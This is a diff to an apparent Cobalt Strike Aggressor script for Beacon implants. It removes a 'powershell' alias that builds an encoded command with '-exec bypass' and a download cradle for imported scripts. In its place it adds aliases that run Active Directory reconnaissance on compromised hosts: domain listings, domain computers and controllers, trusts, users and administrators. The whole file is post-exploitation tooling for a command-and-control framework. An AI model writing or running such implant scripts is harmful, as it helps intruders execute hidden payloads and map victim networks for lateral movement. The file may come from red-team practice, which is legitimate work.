@@ -2,28 +2,38 @@
 on beacon_initial {
 	bsleep($1 , 0 , 30);
 }
-
-alias powershell {
-	local('$args $cradle $runme $cmd');
-	
-	# $0 is the entire command with no parsing.
-	$args   = substr($0, 11);
-	
-	# generate the download cradle (if one exists) for an imported PowerShell script
-	$cradle = beacon_host_imported_script($1);
-	# encode our download cradle AND cmdlet+args we want to run
-	$runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
-	
-	# Build up our entire command line.
-	$cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
-	
-	# task Beacon to run all of this.
-	btask($1, "Tasked beacon to run: $args", "T1086");
-	beacon_execute_job($1, "powershell", $cmd, 1);
+beacon_command_register("Get-Domain", "Get-Domain info");
+beacon_command_register("Get-DomainGroup", "Get-DomainGroup info");
+beacon_command_register("Get-DomainUser", "Get-DomainUser info");
+beacon_command_register("Get-DomainADUser", "Get-DomainADUser info");
+beacon_command_register("Get-DomainComputer", "Get-DomainComputer info");
+beacon_command_register("Get-Domain_trusts", "Get-Domain_trusts info");
+beacon_command_register("Get-DomainControllers", "Get-DomainControllers info");
+alias Get-Domain
+{
+	bshell($1, "net view /domain");
 }
-
-beacon_command_register(
-	"powershell", 
-	"直接运行Powershell", 
-	"");
-
+alias Get-DomainGroup
+{
+	bshell($1, "net group /domain");
+}
+alias Get-DomainComputer
+{
+	bshell($1, "net group \"domain computers\" /domain");
+}
+alias Get-Domain_trusts
+{
+	bshell($1, "nltest /domain_trusts");
+}
+alias Get-DomainControllers
+{
+	bshell($1, "net group \"Domain Controllers\" /domain");
+}
+alias Get-DomainUser
+{
+	bshell($1, "net user /domain");
+}
+alias Get-DomainADUser
+{
+	bshell($1, "net localgroup administrators /domain");
+}
